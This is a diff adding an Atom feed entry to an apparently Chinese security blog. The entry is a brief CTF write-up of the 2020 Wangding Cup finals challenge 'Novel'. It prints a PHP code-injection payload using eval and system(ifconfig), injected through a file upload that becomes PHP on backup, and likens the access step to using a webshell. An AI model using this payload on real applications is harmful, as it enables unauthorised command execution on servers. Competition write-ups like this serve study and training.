@@ -36,6 +36,28 @@
   </entry>
   
   <entry>
+    <title>2020年网鼎杯总决赛复现</title>
+    <link href="https://hack-for.fun/d3b1.html"/>
+    <id>https://hack-for.fun/d3b1.html</id>
+    <published>2020-12-05T16:20:39.000Z</published>
+    <updated>2020-12-05T17:19:22.161Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-总决赛-Novel"><a href="#网鼎杯-2020-总决赛-Novel" class="headerlink" title="[网鼎杯 2020 总决赛]Novel"></a>[网鼎杯 2020 总决赛]Novel</h1><p>上传，备份的时候转为了php。</p><p><code>echo $&#123;eval(eval(system(ifconfig)))&#125;;</code></p><p><code>php &gt; echo $&#123;eval(system(ifconfig))&#125;;</code></p><p>上传时的请求包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201206011537.png" alt="image-20201206003951631"></p><p>私藏的请求包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201206011538.png" alt="image-20201206003933467"></p><p>带上密码去访问，有点想访问webshell的感觉。只不过这里相当于有两个密码。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-总决赛-Novel&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-总决赛-Novel&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 总决赛]Novel&quot;&gt;&lt;/a&gt;[网鼎杯 2020 总决赛]Novel&lt;/h1&gt;&lt;p&gt;上传，备</summary>
+      
+    
+    
+    
+    
+    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2020年网鼎杯半决赛复现</title>
     <link href="https://hack-for.fun/6ebd.html"/>
     <id>https://hack-for.fun/6ebd.html</id>
